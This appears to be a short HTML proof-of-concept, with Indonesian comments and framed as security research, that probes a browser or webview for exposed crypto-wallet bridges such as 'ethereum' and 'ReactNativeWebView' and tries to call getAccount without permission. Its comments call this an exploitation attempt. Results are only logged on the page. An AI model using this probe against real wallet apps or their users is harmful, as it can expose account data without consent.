<!DOCTYPE html>
<html>
<body>
    <h3>Security Research: Bridge Validation Test</h3>
    <button onclick="testBridge()">Tes Koneksi Bridge</button>
    <pre id="log"></pre>

    <script>
        function log(msg) {
            document.getElementById('log').innerHTML += msg + "\n";
        }

        function testBridge() {
            // Skenario: Mencoba mengakses fungsi native yang terekspos
            // Nama bridge berbeda-beda tiap wallet (misal: ethereum, walletBridge, InjectedProvider)
            
            const potentialBridges = ['ethereum', 'walletBridge', 'ReactNativeWebView', '1inchBridge'];
            
            potentialBridges.forEach(bridge => {
                if (window[bridge]) {
                    log("DITEMUKAN: " + bridge + " bridge tersedia!");
                    
                    // Mencoba memanggil fungsi tanpa izin (Exploitation Attempt)
                    try {
                        console.log("Mencoba memanggil fungsi getAccount...");
                        const data = window[bridge].getAccount ? window[bridge].getAccount() : "No getAccount";
                        log("Hasil: " + JSON.stringify(data));
                    } catch (e) {
                        log("Gagal memanggil fungsi (terproteksi): " + e.message);
                    }
                } else {
                    log("Bridge " + bridge + " tidak ditemukan.");
                }
            });
        }
    </script>
</body>
</html>
